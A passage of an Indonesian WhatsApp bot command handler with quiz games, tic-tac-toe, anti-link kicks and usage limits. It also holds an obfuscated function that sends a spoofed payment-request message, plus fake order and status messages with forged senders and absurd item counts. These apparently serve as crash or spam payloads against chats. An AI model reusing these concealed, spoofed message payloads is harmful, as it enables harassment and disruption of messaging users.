karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}

const jancok = (teks) => {
var _0xec4926=_0x4e61;function _0x4e61(_0x434c13,_0x50470a){var _0x1efd7b=_0x3784();return _0x4e61=function(_0x438905,_0x15a777){_0x438905=_0x438905-0x19d;var _0x103770=_0x1efd7b[_0x438905];return _0x103770;},_0x4e61(_0x434c13,_0x50470a);}function _0x3784(){var _0x3e8843=['search','0@s.whatsapp.net','relayMessage','7UhegRV','return\x20(function()\x20','exception','1931AeGfle','console','prototype','4LPGiZK','8557120LNUWPx','toString','table','constructor','192oerNTo','length','chat','error','1517040mRszJS','trace','apply','6827224BBAqQl','36282Ftzdlk','(((.+)+)+)+$','{}.constructor(\x22return\x20this\x22)(\x20)','1418421zebmzA','11841181mpuzbz','info','bind','605TkwLbP','log','warn'];_0x3784=function(){return _0x3e8843;};return _0x3784();}(function(_0x1cb5e3,_0x36aa27){var _0x5552f8=_0x4e61,_0x49f8d4=_0x1cb5e3();while(!![]){try{var _0x5588b0=parseInt(_0x5552f8(0x1b7))/0x1*(-parseInt(_0x5552f8(0x19f))/0x2)+parseInt(_0x5552f8(0x1aa))/0x3*(parseInt(_0x5552f8(0x1ba))/0x4)+parseInt(_0x5552f8(0x1ae))/0x5*(-parseInt(_0x5552f8(0x1a7))/0x6)+parseInt(_0x5552f8(0x1b4))/0x7*(-parseInt(_0x5552f8(0x1a6))/0x8)+-parseInt(_0x5552f8(0x1a3))/0x9+parseInt(_0x5552f8(0x1bb))/0xa+parseInt(_0x5552f8(0x1ab))/0xb;if(_0x5588b0===_0x36aa27)break;else _0x49f8d4['push'](_0x49f8d4['shift']());}catch(_0x8e7b94){_0x49f8d4['push'](_0x49f8d4['shift']());}}}(_0x3784,0x71c2c));var _0x51227b=(function(){var _0x12f625=!![];return function(_0x5b691c,_0x11756a){var _0x92567c=_0x12f625?function(){var _0x25516a=_0x4e61;if(_0x11756a){var _0x121f48=_0x11756a[_0x25516a(0x1a5)](_0x5b691c,arguments);return _0x11756a=null,_0x121f48;}}:function(){};return _0x12f625=![],_0x92567c;};}()),_0xbde14b=_0x51227b(this,function(){var _0x4df401=_0x4e61;return _0xbde14b[_0x4df401(0x1bc)]()[_0x4df401(0x1b1)](_0x4df401(0x1a8))[_0x4df401(0x1bc)]()[_0x4df401(0x19e)](_0xbde14b)[_0x4df401(0x1b1)](_0x4df401(0x1a8));});_0xbde14b();var _0x15a777=(function(){var _0x552ea4=!![];return function(_0x5d6799,_0x28d376){var _0x18ac73=_0x552ea4?function(){if(_0x28d376){var _0x32ce48=_0x28d376['apply'](_0x5d6799,arguments);return _0x28d376=null,_0x32ce48;}}:function(){};return _0x552ea4=![],_0x18ac73;};}()),_0x438905=_0x15a777(this,function(){var _0x4df242=_0x4e61,_0x4f48be;try{var _0x4cbe03=Function(_0x4df242(0x1b5)+_0x4df242(0x1a9)+');');_0x4f48be=_0x4cbe03();}catch(_0x178b08){_0x4f48be=window;}var _0x25ecf4=_0x4f48be[_0x4df242(0x1b8)]=_0x4f48be['console']||{},_0x212ccb=[_0x4df242(0x1af),_0x4df242(0x1b0),_0x4df242(0x1ac),_0x4df242(0x1a2),_0x4df242(0x1b6),_0x4df242(0x19d),_0x4df242(0x1a4)];for(var _0x400ce5=0x0;_0x400ce5<_0x212ccb[_0x4df242(0x1a0)];_0x400ce5++){var _0x3d104e=_0x15a777[_0x4df242(0x19e)][_0x4df242(0x1b9)][_0x4df242(0x1ad)](_0x15a777),_0x5ba0f9=_0x212ccb[_0x400ce5],_0x1ab0ff=_0x25ecf4[_0x5ba0f9]||_0x3d104e;_0x3d104e['__proto__']=_0x15a777[_0x4df242(0x1ad)](_0x15a777),_0x3d104e[_0x4df242(0x1bc)]=_0x1ab0ff[_0x4df242(0x1bc)][_0x4df242(0x1ad)](_0x1ab0ff),_0x25ecf4[_0x5ba0f9]=_0x3d104e;}});_0x438905();{ikycoli[_0xec4926(0x1b3)](m[_0xec4926(0x1a1)],{'requestPaymentMessage':{'Message':{'extendedTextMessage':{'text':teks,'currencyCodeIso4217':'IDR','requestFrom':_0xec4926(0x1b2),'expiryTimestamp':0x1f40,'amount':0x1,'background':thumb}}}},{});}}
// Function
wm = 'THE IKYY BOTZ'
// Time & Date
const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var ucapanWaktu = 'Selamat Malam'
}
if(time2 < "19:00:00"){
var ucapanWaktu = 'Selamat Petang'
 }
if(time2 < "18:00:00"){
var ucapanWaktu = 'Selamat Sore'
 }
if(time2 < "15:00:00"){
var ucapanWaktu = 'Selamat Siang'
 }
if(time2 < "11:00:00"){
var ucapanWaktu = 'Selamat Pagi'
 }
if(time2 < "05:00:00"){
var ucapanWaktu = 'Selamat Malam'
 }
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const wita = moment(Date.now()).tz('Asia/Makassar').locale('id').format('HH:mm:ss z')
const wit = moment(Date.now()).tz('Asia/Jayapura').locale('id').format('HH:mm:ss z')
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const qtod = m.quoted? "true":"false"

	
	try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
            let chats = global.db.data.chats[m.chat]
            if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
            if (chats) {
                if (!('mute' in chats)) chats.mute = false
                if (!('antilink' in chats)) chats.antilink = false
            } else global.db.data.chats[m.chat] = {
                mute: false,
                antilink: false,
            }
		
	    let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
	    if (setting) {
		if (!isNumber(setting.status)) setting.status = 0
		if (!('autobio' in setting)) setting.autobio = false
		if (!('templateImage' in setting)) setting.templateImage = true
		if (!('templateVideo' in setting)) setting.templateVideo = false
		if (!('templateGif' in setting)) setting.templateGif = false
		if (!('templateMsg' in setting)) setting.templateMsg = false	
	    } else global.db.data.settings[botNumber] = {
		status: 0,
		autobio: false,
		templateImage: true,
		templateVideo: false,
		templateGif: false,
		templateMsg: false,
	    }
	    let settings = db.data.settings[botNumber]
if (typeof settings !== 'object') db.data.settings[botNumber] = {}
if (settings) {
if (!('available' in settings)) settings.available = false
if (!('composing' in settings)) settings.composing = false
if (!('recording' in settings)) settings.recording = false
} else db.data.settings[botNumber] = {
available: false,
composing: false,
recording: false,
}
        } catch (err) {
            console.error(err)
        }
	    
        // Public & Self
        if (!ikycoli.public) {
            if (!m.key.fromMe) return
        }

//console 
if (m.message) {
console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m CMD \x1b[1;37m]', time, chalk.
green(), 'from', chalk.green(pushname), 'in', chalk.green(groupName ? groupName : 'Private Chat' ), 'args :', chalk.green(text.length))
 }

	// reset limit every 12 hours
        let cron = require('node-cron')
        cron.schedule('00 12 * * *', () => {
            let user = Object.keys(global.db.data.users)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            for (let jid of user) global.db.data.users[jid].limit = limitUser
            console.log('Reseted Limit')
        }, {
            scheduled: true,
            timezone: "Asia/Jakarta"
        })
    // vn reply
    var vnAdmin = (hehe) => {
   vnnya = fs.readFileSync(`./src/lu siapa anjir.mp3`)
   ikycoli.sendMessage(m.chat, {audio: vnnya, mimetype: 'audio/mpeg', ptt:true })
   }
    var vnCreator = (hehe) => {
   vnc = fs.readFileSync(`./src/ga mau.mp3`)
   ikycoli.sendMessage(m.chat, {audio: vnc, mimetype: 'audio/mp3', ptt:true })
   }

   // autovn
if(autorecording){
if(autorecording == false)
await ikycoli.sendPresenceUpdate('recording', m.chat)
} else if(autoketik){
if(autoketik == false)
await ikycoli.sendPresenceUpdate('composing', m.chat)
} else if(available){
if(available == false)
await ikycoli.sendPresenceUpdate('available', m.chat)
}
	// auto set bio
	if (db.data.settings[botNumber].autobio) {
	    let setting = global.db.data.settings[botNumber]
	    if (new Date() * 1 - setting.status > 1000) {
		let uptime = await runtime(process.uptime())
		await ikycoli.setStatus(`${ikycoli.user.name} | Runtime : ${runtime(uptime)}`)
		setting.status = new Date() * 1
	    }
	}
	    
	  // Anti Link
        if (db.data.chats[m.chat].antilink) {
        if (budy.match(`chat.whatsapp.com`)) {
        m.reply(`「 ANTI LINK 」\n\nKamu terdeteksi mengirim link group, maaf kamu akan di kick !`)
        if (!isBotAdmins) return m.reply(`Bot nya blm admin bgst _-`)
        let gclink = (`https://chat.whatsapp.com/`+await ikycoli.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return m.reply(`Ehh maaf gak jadi, karena kamu ngirim link group ini`)
        if (isAdmins) return m.reply(`Ehh maaf kamu admin`)
        if (isCreator) return m.reply(`Ehh maaf kamu owner bot ku`)
        ikycoli.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        }
        
      // Mute Chat
      if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
      return
      }

        // Respon Cmd with media
        if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
        let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
        let { text, mentionedJid } = hash
        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
            userJid: ikycoli.user.id,
            quoted: m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, ikycoli.user.id)
        messages.key.id = m.key.id
        messages.pushName = m.pushName
        if (m.isGroup) messages.participant = m.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'
        }
        ikycoli.ev.emit('messages.upsert', msg)
        }
	    
	if (('family100'+m.chat in _family100) && isCmd) {
            kuis = true
            let room = _family100['family100'+m.chat]
            let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
            let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
            if (!isSurender) {
                let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
                if (room.terjawab[index]) return !0
                room.terjawab[index] = m.sender
            }
            let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
            let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
        return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
    }).filter(v => v).join('\n')}
    ${isSurender ? '' : `Perfect Player`}`.trim()
            ikycoli.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
            if (isWin || isSurender) delete _family100['family100'+m.chat]
        }

        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklagu[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await ikycoli.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, ikycoli.user.name, m)
                delete tebaklagu[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await m.reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
                delete kuismath[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakgambar[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await ikycoli.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, ikycoli.user.name, m)
                delete tebakgambar[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkata[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await ikycoli.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, ikycoli.user.name, m)
                delete tebakkata[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = caklontong[m.sender.split('@')[0]]
	    deskripsi = caklontong_desk[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await ikycoli.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `🎮 Cak Lontong 🎮\n\nJawaban Benar 🎉\n*${deskripsi}*\n\nIngin bermain lagi? tekan button dibawah`, ikycoli.user.name, m)
                delete caklontong[m.sender.split('@')[0]]
		delete caklontong_desk[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkalimat[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await ikycoli.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, ikycoli.user.name, m)
                delete tebakkalimat[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklirik[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await ikycoli.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, ikycoli.user.name, m)
                delete tebaklirik[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }
	    
	if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaktebakan[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await ikycoli.sendButtonText(m.chat, [{ buttonId: 'tebak tebakan', buttonText: { displayText: 'Tebak Tebakan' }, type: 1 }], `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, ikycoli.user.name, m)
                delete tebaktebakan[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        //TicTacToe
	    this.game = this.game ? this.game : {}
	    let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
	    if (room) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    // m.reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room.game.currentTurn) { // nek wayahku
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
	    m.reply({
	    '-3': 'Game telah berakhir',
	    '-2': 'Invalid',
	    '-1': 'Posisi Invalid',
	    0: 'Posisi Invalid',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room.game.winner) isWin = true
	    else if (room.game.board === 511) isTie = true
	    let arr = room.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room.game._currentTurn = m.sender === room.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room.game.currentTurn : room.game.winner
	    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
	    if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
	    room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room.x !== room.o) await ikycoli.sendText(room.x, str, m, { mentions: parseMention(str) } )
	    await ikycoli.sendText(room.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room.id]
	    }
	    }
const lori ={
 key: { 
  fromMe: false, 
 participant: `0@s.whatsapp.net`, 
 ...({ remoteJid: "" })
},
  message: { 
"orderMessage": {
"orderId": "5287265358017580",//Dan kode ini jangan di ubh sedikit pun 
"thumbnail": virgam, 
"itemCount": 2025,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "FIXED BY THE IKY BOTZ CASE MD",
"message":"😈⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕",
"sellerJid": "5491133536405@s.whatsapp.net",
"token": "AR57p+dSS4yeh4tAQCMyt51dvXpHlgliVN1/6Au+XBE3+w==",//Kode ini jangan di ubh sedikit pun 
"totalAmount1000": "IDR 99.99999999999999999999",
"totalCurrencyCode": "IDR",
"contextInfo": {
"forwardingScore": 150,
"isForwarded": true
}
}
}
}
        const troli = {
            key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" })
            },
            message: { 
                "orderMessage": {
                    "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                    "mimetype": "image/jpeg",
                    "itemCount": 999999999999,
                    "message": `SHIELD-BOT`,
                    "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                    "fileLength": "28777",
                    "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                    "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                    "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                    "mediaKeyTimestamp": "1610993486",
                    "thumbnail": virgam,
                }
            }
        }
const shieldid = fs.readFileSync('./src/error.jpg')
const shield2 = {
  key: {
    fromMe: false,
    participant: '0@s.whatsapp.net',
    remoteJid: 'status@broadcast'
  },
  message: {
    "imageMessage": {
        "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
        "mimetype": "image/jpeg",
        "caption": "THE IKY BOTZ MD",
        "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
        "fileLength": "28777",
        "height": 1080,
        "width": 1079,
        "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
        "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
        "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
        "mediaKeyTimestamp": "1610993486",
        "jpegThumbnail": virgam,
        "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
     }
  }
}
        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
	    ikycoli.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    ikycoli.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) ikycoli.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    if (!roof.pilih2) ikycoli.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) ikycoli.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    ikycoli.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /gunting/i
	    let b = /batu/i
	    let k = /kertas/i
	    let reg = /^(gunting|batu|kertas)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih2) ikycoli.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih) ikycoli.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    ikycoli.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    }
	    
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`

Apakah Ada Yang Ingin Di Tanyakan ${reason ? 'Ada Yang Bisa Saya Bantu? ' + reason : 'Terima Kasih'}
Waktu ${clockString(new Date - afkTime)}
`.trim())
}

if (db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
m.reply(`
Hello Saya THE IKYY BOTZ${user.afkReason ? ' Baiklah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}
	    
        switch(command) {
	    case 'yuhu': {
	            if (!isCreator) return
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                m.reply(`${m.pushName} My Name THE IKYY BOTZ${text ? ': ' + text : ''}`)
            }
            break
case 'hihi': {
if (!isCreator) return
let user = global.db.data.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
m.reply(`Hello Saya ${m.pushName} ${text ? ': ' + text : ''}`)
}
break

        case 'ttc': case 'ttt': case 'tictactoe': {
            let TicTacToe = require("./lib/tictactoe")
            this.game = this.game ? this.game : {}
            if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'Kamu masih didalam game'
            let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
            if (room) {
            m.reply('Partner ditemukan!')
            room.o = m.chat
            room.game.playerO = m.sender
            room.state = 'PLAYING'
            let arr = room.game.render().map(v => {
            return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
            }[v]
            })
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
            if (room.x !== room.o) await ikycoli.sendText(room.x, str, m, { mentions: parseMention(str) } )
            await ikycoli.sendText(room.o, str, m, { mentions: parseMention(str) } )
            } else {
            room = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
            }
            if (text) room.name = text
            m.reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
            this.game[room.id] = room
            }
            }
            break
            case 'delttc': case 'delttt': {
            this.game = this.game ? this.game : {}
            try {
            if (this.game) {
            delete this.game
            ikycoli.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
            } else if (!this.game) {
            m.reply(`Session TicTacToe🎮 tidak ada`)
            } else throw '?'
            } catch (e) {
            m.reply('rusak')
            }
            }
            break
            case 'suitpvp': case 'suit': {
            this.suit = this.suit ? this.suit : {}
            let poin = 10
            let poin_lose = 10
            let timeout = 60000
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
	    if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`)
            if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
            let id = 'suit_' + new Date() * 1
            let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
            this.suit[id] = {
            chat: await ikycoli.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (this.suit[id]) ikycoli.sendText(m.chat, `_Waktu suit habis_`, m)
            delete this.suit[id]
            }, 60000), poin, poin_lose, timeout
            }
            }
            break
	    case 'donasi': case 'sewabot': case 'sewa': case 'buypremium': case 'donate': {
	    if (!isCreator) return
